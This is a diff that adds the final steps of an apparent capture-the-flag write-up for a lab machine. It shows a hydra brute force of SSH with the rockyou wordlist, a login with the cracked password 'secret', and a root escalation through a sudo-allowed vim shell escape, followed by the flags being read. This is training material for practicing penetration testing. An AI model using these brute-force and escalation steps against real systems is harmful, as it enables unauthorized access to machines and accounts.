@@ -154,6 +154,43 @@ ftp> get ForMitch.txt
 cat ForMitch.txt                             
 Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
 ```
-
+-s 2222
+```
+hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.129.143.203 -s 2222
+```
+```
+[2222][ssh] host: 10.129.143.203   login: mitch   password: secret
+````
+```
+ssh mitch@10.129.143.203 -p 2222
+```
+```
+$ pwd
+/home/mitch
+$ ls
+user.txt
+$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+```
+```
+$ sudo vim
+```
+```
+:!/bin/bash
+```
+```
+root@Machine:~# whoami
+root
+root@Machine:~# ls
+user.txt
+root@Machine:~# cat user.txt
+G00d j0b, keep up!
+root@Machine:~# cd /root
+root@Machine:/root# ls
+root.txt
+root@Machine:/root# cat root.txt
+W3ll d0n3. You made it!
+```
 
 
